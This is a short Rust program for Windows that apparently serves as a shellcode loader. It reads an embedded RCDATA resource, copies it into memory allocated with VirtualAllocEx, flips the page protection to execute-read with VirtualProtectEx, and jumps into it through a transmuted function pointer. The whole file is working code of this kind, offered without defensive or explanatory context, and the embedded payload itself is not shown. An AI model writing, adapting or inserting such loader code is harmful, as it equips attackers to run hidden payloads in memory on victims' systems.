#[allow(deprecated)]
use std::{
    intrinsics::copy_nonoverlapping,
    mem::transmute,
    ptr::{null, null_mut},
};

use windows_sys::{
    Win32::{
        Foundation::{HGLOBAL, HRSRC},
        System::{
            LibraryLoader::{FindResourceA, LoadResource, LockResource, SizeofResource},
            Memory::{
                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
                VirtualProtectEx,
            },
            Threading::GetCurrentProcess,
        },
    },
    core::PCSTR,
};

fn main() {
    unsafe {
        let resource: HRSRC = FindResourceA(null_mut(), 101 as PCSTR, 10 as PCSTR);
        let mut size: u32 = 0;

        let mut resource_ptr: *const u8 = null();

        if !resource.is_null() {
            size = SizeofResource(null_mut(), resource);
            let h_global: HGLOBAL = LoadResource(null_mut(), resource);
            resource_ptr = LockResource(h_global) as *const u8;
        }

        if !resource_ptr.is_null() {
            let exec_mem = VirtualAllocEx(
                GetCurrentProcess(),
                null_mut(),
                size as usize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );

            copy_nonoverlapping(resource_ptr, exec_mem as *mut u8, size as usize);

            let mut old_protect: u32 = 0;
            VirtualProtectEx(
                GetCurrentProcess(),
                exec_mem,
                size as usize,
                PAGE_EXECUTE_READ,
                &mut old_protect,
            );

            let exec_func: extern "system" fn() = transmute(exec_mem);
            exec_func();
        }
    }
}
